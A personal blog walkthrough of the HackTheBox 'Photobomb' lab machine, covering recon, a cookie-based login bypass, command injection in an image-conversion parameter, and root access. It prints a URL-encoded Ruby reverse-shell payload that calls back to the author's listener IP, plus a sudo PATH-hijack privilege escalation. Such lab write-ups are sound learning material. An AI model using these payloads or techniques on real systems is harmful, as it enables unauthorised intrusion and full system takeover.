---
id: 6
title: CTF Walkthroughs - Photobomb
description: My walkthrough of the Photobomb machine on hackthebox.com
publishedDate: 01/25/2023
featureImage: https://i.imgur.com/LbooXdNh.png
tags:
  - ctf_walkthroughs
---

## Intro

Hello Internet!

So I know it's been a few months since my last post, ugh I told myself I wouldn't go this long in between posts!

It's been a while since my last post, but I've actually been pretty busy in the pentesting/learning area! I worked through the whole advent of cyber program throughout December, and started working through the Red Team Modules in TryHackMe.com as well!

So I thought I might take a little bit of a break from TryHackMe, and started looking at HackTheBox.com. My goal is to take my OSCP test later this year, so I'm trying to get into more of a frequency of working on these vulnerable boxes. Unintended side effect of this is that means I'll be having more posts as I work through these!

So anyways, to get a feel for HackTheBox, I did a couple easy machines. One of them, soccer, I confess I did while going through someone else's walkthrough, so I didn't think that should be one that I blog about. I then did precious.htb, but I was kind of bad about not taking screenshots of the steps, so I finished getting the flags, but I kind of gave up on the write-up.

So today I'm writing about the photobomb HackTheBox machine! This machine is rated easy (I'm sticking with the easy ones for now until I start to feel more comfortable with what I'm doing), and has quite a few owns on it, so it looks like it should be a good first post on HackTheBox!

Ok, let's get started!

## Recon

First off, I started with an nmap scan.

`nmap -sC -sV 10.10.11.182`

![f11e59756439cc78acbbe502479884df.png](https://i.imgur.com/lT0h4nl.png)
Ok, looks like ports 22 and 80 are open, and if I try to hit http://10.10.11.182, I get an attempted redirect to http://photobomb.htb. So looks like I need to add that to my host file.

After adding the host file entry, I first navigate to the page, and this is what I see:
![b42737bbdd4c2b0c052b0fa734970e6e.png](https://i.imgur.com/sjqxJYX.png)
I reload the page with the network tab open and start looking at the headers in the response. I've noticed that with the HTB machines compared to the TryHackMe rooms, it seems like with the boxes I've done there's been way more emphasis on the headers.

Anyways, nothing in the headers, but there's a link on the home page to "get started", guess I'll try that out?

![d34a1463dda6cfa17bf6c9cbaad989df.png](https://i.imgur.com/ofrKhFi.png)
Ooohhh, ok, looks like I need a login for that, not going to get there yet...
Ok, I go ahead and git dirbuster up and running to see if there are any other pages to look at. If you haven't picked up from my screenshots, I'm using Kali for this, I used TryHackMe's Attackbox throughout my posts on those rooms, just for ease of use. Since I'm starting to study for OSCP though, I figured it was time to actually start using a dedicated instance, so I'm running a VM of Kali to work from.

While dirbuster is running, I start looking through the CSS files and JS files to see if there is anything I can work with from there.

![afe2dbd2315a0de9484da62e416e588c.png](https://i.imgur.com/6zroPoI.png)
Looks like in photobomb.js there's a reference to look for a cookie, and if that cookie is set, then you get routed to some sort of page...

![763e0f59f129202e79ede2e3d27109dd.png](https://i.imgur.com/LbooXdN.png)Hmmmm, interesting, looks like that "logs me in" as the pH0t0 user, neat!

Ok, so it doesn't look like there's much to this page, you pick an image, an image size value and image type value and, the site returns with the image in that size and format.

![1e4ff86a80bae992b87339f723eb0875.png](https://i.imgur.com/PTr7MO3.png) It looks like the filename, filetype and image size parameters are sent back in the POST request, I wonder if I can manipulate those parameters?

I'm just going to try removing one of them to see if I get any errors.

![c3395328f85a178255c706ad473f12ad.png](https://i.imgur.com/6Jytho4.png)
Ahhh, interesting! So I removed the photo parameter from the POST request, and triggered a Sinatra error page that displays the code where the error occurred! I'm now able to read part of the file that's doing this processing!

I wonder if the same thing will happen if I remove other parameters.
![f467029dadd834cd4ea7d26513efc821.png](https://i.imgur.com/2kokHw9.png) Here's the part of the code that looks at the filetype parameter.

![daf44de473b8b15ddabfb5efb5b888f4.png](https://i.imgur.com/vyOv6gE.png) Here's the part of the code that looks at the file Size parameter.

## Foothold

OK, from looking at that fileType parameter, it looks like there's just a check to see if "png" or "jpg" is in the parameter. I'm going to see if I can inject any commands into that parameter and maybe trigger something. Unfortunately, there's no response text section, so I can't just like inject "whoami" or "echo $PWD" or anything fun like that. I'll set up a netcat listener and see if maybe I can use curl?

Here's the modified request
![18bada8ec0ce69f87c5c2f3525b38215.png](https://i.imgur.com/q2JdlXd.png)
![d2750cd46ba3be02c1e432e449f6f263.png](https://i.imgur.com/0aNdW1i.png) Heyyyyy, looks like we can use curl! (Had to recreate this screenshot after disconnecting and re-connecting, so the IP was different)
Ok, I think from here I have to try and get some sort of reverse shell going

I used reverseshells.com and spent a good few hours trying a number of different options, both URLEncoded and not encoded. Ultimately I eventually realized that if this site is using Sinatra and the errors we saw were from Ruby files, we should be able to use Ruby for a reverse shell!

Here's the request. minus any spaces and with the %3b in place of a semicolon:
`%3bruby+-rsocket+-e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.14.33",9090))'`
![0e101cbc272c78a010f4ba295e9fe5da.png](https://i.imgur.com/PLoL0Du.png)

![123f6ace8a0ac0f3781d5df29796a03b.png](https://i.imgur.com/lQUEaZh.png)Aaaaannnnd we have the terminal now!

Before looking for flags, let's get this to a more stable terminal session
`python3 -c "import pty; pty.spawn('/bin/bash')"`

I still can't use my arrow keys or tab-complete, but this is a little more stable.

The user flag was fairly easy to find, just in /home/wizard/user.txt

## Privilege Escalation

With the user flag out of the way, I wanted to start looking for privilege escalation vulnerabilities. Let's check if my user can run any sudo commands

`sudo -l`

![42f55b6f6c4baf004e7753f2bc546b39.png](https://i.imgur.com/Ivf0w3N.png)
Interesting.... Looks like I can run this cleanup.sh script witrh sudo privileges and don't even need the password!
Let's take a look at this cleanup.sh file
![433882a1f54fd6cb3ade3bef9a744396.png](https://i.imgur.com/rYNwCiR.png) Ok, so I notice that most of the commands have the full path to the command listed ("/usr/bin/truncate" instead of just "truncate"). The last line of the script has both the "find" command and the "chown" command without the full path.
Because of this, I should be able to add append another location to the beginning of the $PATH environment variable, and write my own definition of either the "find" or "chown" command. I can put anything I want in there then and (hopefully) get a root shell!

I tested this out by making a "find" file with just "whoami" as the command inside the file

`echo "whoami" > find`

I next had to make the file executable:
`chmod +x file`

Then I added the current working directory to the PATH variable temporarily and ran the script:
`sudo PATH=$PWD:$PATH /opt/cleanup.`
You can see in the screenshot I tried to run it when the find file didn't have executable privileges, but once I set those privileges, then it worked!
![40a0c3670164a6aa3381f3fa8a1c2e85.png](https://i.imgur.com/T3DeGuK.png)
Ok cool, I just have to change the find file to run "bash" and we should be golden!

I wasn't able to get an editor up, so I just deleted the find file I made earlier and made a new one:
![a56526cf1636bea89dddb49d0723edde.png](https://i.imgur.com/U3QVyam.png)
We have root access now!!

Root flag was just in /root/root.txt, so nothing too difficult to find!

Welp, that wraps up this machine! I admit, I got stuck on the reverse shell payload for a good couple of hours, and I also got stuck on the privilege escalation for a while (I tried exporting the path with the directory and for some reason it was working. Then I was accidentally writing `sudo $PATH=$PWD:$PATH /opt/cleanup.` and it wasn't doing anything either).

Not too bad for one of my first machines on Hack The Box though! Since I'm now studying up for my OSCP test, I'll (hopefully) be posting more of these, so we'll see you (soon) on the next one!
